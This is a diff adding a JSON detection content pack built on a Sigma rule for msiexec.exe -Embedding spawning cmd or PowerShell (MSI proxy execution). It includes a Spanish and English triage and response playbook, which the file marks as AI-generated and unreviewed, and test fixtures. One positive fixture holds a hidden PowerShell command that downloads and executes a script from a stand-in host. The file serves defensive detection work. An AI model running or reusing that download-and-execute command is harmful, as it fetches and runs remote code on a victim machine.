@@ -1,0 +1,140 @@
+{
+  "rule": {
+    "id": "4a2a2c3e-209f-4d01-b513-4155a540b469",
+    "title": "Suspicious MsiExec Embedding Parent",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_msiexec_embedding.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_msiexec_embedding.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.007"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso msiexec.exe iniciado con -Embedding (servidor COM de Windows Installer) generó cmd.exe, powershell.exe o pwsh.exe. Puede ser una custom action legítima de un instalador o un paquete MSI malicioso que ejecuta un payload a través de msiexec.",
+      "what_it_detects": "Eventos de creación de procesos donde Image termina en cmd.exe, powershell.exe o pwsh.exe y ParentCommandLine contiene 'MsiExec.exe' y '-Embedding '. Se excluyen el Splunk Universal Forwarder y los casos conocidos de Visual Studio/DISM (DismFoDInstall.cmd o 'Global\\MSI0000').",
+      "why_it_matters": "Los atacantes abusan de msiexec.exe, un binario firmado por Microsoft, para ejecutar código mediante paquetes MSI con custom actions (ATT&CK T1218.007, System Binary Proxy Execution: Msiexec). Así evaden controles que confían en binarios del sistema y ocultan el origen real de la ejecución.",
+      "triage_steps": [
+        "Revise CommandLine del shell hijo: busque comandos codificados (-enc), descargas, -nop -w hidden, rutas en %TEMP% o AppData y ejecución de scripts no habituales.",
+        "Identifique qué instalación MSI estaba en curso: busque en el mismo host, +/- 15 minutos, procesos msiexec.exe con /i o /package y la ruta del archivo .msi.",
+        "Verifique el origen del .msi: ruta, hash, firma digital y si llegó por navegador, correo o una URL remota (msiexec /i http...).",
+        "Revise el log de aplicación (MsiInstaller, eventos 1033/11707) para conocer el nombre del producto, fabricante y usuario que lo instaló.",
+        "Pivotee sobre los procesos hijos del cmd.exe o powershell.exe, conexiones de red salientes y archivos escritos o tareas programadas creadas.",
+        "Compruebe si el software proviene de su herramienta de despliegue (SCCM, Intune, GPO) y si otros hosts muestran la misma ParentCommandLine.",
+        "Busque alertas previas para el mismo host y usuario, sobre todo descargas o ejecución inicial."
+      ],
+      "false_positives": [
+        "Custom actions legítimas de instaladores comerciales o internos que invocan cmd.exe o PowerShell para configurar servicios, registro o archivos.",
+        "Despliegues de software corporativo vía SCCM, Intune o GPO con scripts post-instalación.",
+        "Agentes de seguridad o monitoreo cuyo MSI ejecuta scripts no cubiertos por los filtros actuales."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de TI si la instalación era esperada y el paquete es de un proveedor confiable.",
+        "Si es malicioso, aísle el endpoint y preserve el .msi, su hash y los artefactos creados por el shell hijo.",
+        "Termine procesos maliciosos activos y elimine persistencia (servicios, tareas, claves Run) tras documentarla; desinstale el producto con verificación previa.",
+        "Bloquee el hash y el dominio o URL de origen; busque el mismo hash o comando en el resto del parque.",
+        "Si es legítimo, documente el producto y cree una exclusión acotada por ruta de CommandLine o hash del MSI."
+      ],
+      "severity_rationale": "Nivel medio: es un patrón clásico de proxy execution, pero muchos instaladores legítimos usan custom actions con cmd.exe o PowerShell, por lo que requiere validar contexto."
+    },
+    "en": {
+      "summary": "A msiexec.exe process started with -Embedding (the Windows Installer COM server) spawned cmd.exe, powershell.exe or pwsh.exe. This can be a legitimate installer custom action or a malicious MSI package proxying a payload through msiexec.",
+      "what_it_detects": "Process creation events where Image ends with cmd.exe, powershell.exe or pwsh.exe and ParentCommandLine contains 'MsiExec.exe' and '-Embedding '. Splunk Universal Forwarder and known Visual Studio/DISM cases (DismFoDInstall.cmd or 'Global\\MSI0000') are excluded.",
+      "why_it_matters": "Attackers abuse msiexec.exe, a Microsoft-signed binary, to run code through MSI custom actions (ATT&CK T1218.007, System Binary Proxy Execution: Msiexec). This evades controls that trust system binaries and hides the true origin of execution.",
+      "triage_steps": [
+        "Review the child shell CommandLine: look for encoded commands (-enc), downloads, -nop -w hidden, paths in %TEMP% or AppData, and unusual scripts.",
+        "Identify the MSI installation in progress: on the same host within +/- 15 minutes, find msiexec.exe with /i or /package and the .msi path.",
+        "Check the .msi origin: path, hash, digital signature, and whether it came via browser, email or a remote URL (msiexec /i http...).",
+        "Review the Application log (MsiInstaller, events 1033/11707) for product name, manufacturer and installing user.",
+        "Pivot on child processes of the cmd.exe or powershell.exe, outbound network connections, written files and created scheduled tasks.",
+        "Check whether your deployment tooling (SCCM, Intune, GPO) pushed the software and whether other hosts show the same ParentCommandLine.",
+        "Look for earlier alerts for the same host and user, especially downloads or initial execution."
+      ],
+      "false_positives": [
+        "Legitimate custom actions in commercial or internal installers that call cmd.exe or PowerShell to configure services, registry or files.",
+        "Corporate software deployments via SCCM, Intune or GPO with post-install scripts.",
+        "Security or monitoring agents whose MSI runs scripts not covered by the existing filters."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the installation was expected and the package comes from a trusted vendor.",
+        "If malicious, isolate the endpoint and preserve the .msi, its hash and artifacts created by the child shell.",
+        "Kill active malicious processes and remove persistence (services, tasks, Run keys) after documenting it; uninstall the product after verification.",
+        "Block the hash and source domain or URL; hunt for the same hash or command across the fleet.",
+        "If legitimate, document the product and add a narrow exclusion by CommandLine path or MSI hash."
+      ],
+      "severity_rationale": "Medium: it is a classic proxy-execution pattern, but many legitimate installers use cmd.exe or PowerShell custom actions, so context validation is required."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "MSI custom action launches hidden PowerShell that downloads a script",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://update.example.com/a.ps1')\"",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\MsiExec.exe -Embedding 4F2E9A1B7C3D5E6F8A0B1C2D3E4F5A6B C",
+          "ProcessId": 6120,
+          "ParentProcessId": 5480
+        }
+      },
+      {
+        "description": "cmd.exe spawned by msiexec -Embedding running a binary from AppData",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c \"%APPDATA%\\svc\\updater.exe\"",
+          "ParentImage": "C:\\Windows\\SysWOW64\\msiexec.exe",
+          "ParentCommandLine": "C:\\Windows\\SysWOW64\\MsiExec.exe -Embedding 9B8C7D6E5F4A3B2C1D0E9F8A7B6C5D4E E",
+          "ProcessId": 7344,
+          "ParentProcessId": 7012
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Splunk Universal Forwarder installer custom action, excluded by filter_splunk_ufw",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-LOG-01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c \"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk.exe\" enable boot-start",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\MsiExec.exe -Embedding 1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D E",
+          "ProcessId": 4410,
+          "ParentProcessId": 4102
+        }
+      },
+      {
+        "description": "Installer custom action with Global\\MSI0000 in the parent command line, excluded by filter_vs",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c \"C:\\ProgramData\\Microsoft\\VisualStudio\\Packages\\setup.cmd\"",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\MsiExec.exe -Embedding 7E6D5C4B3A2F1E0D9C8B7A6F5E4D3C2B E Global\\MSI0000",
+          "ProcessId": 3988,
+          "ParentProcessId": 3720
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
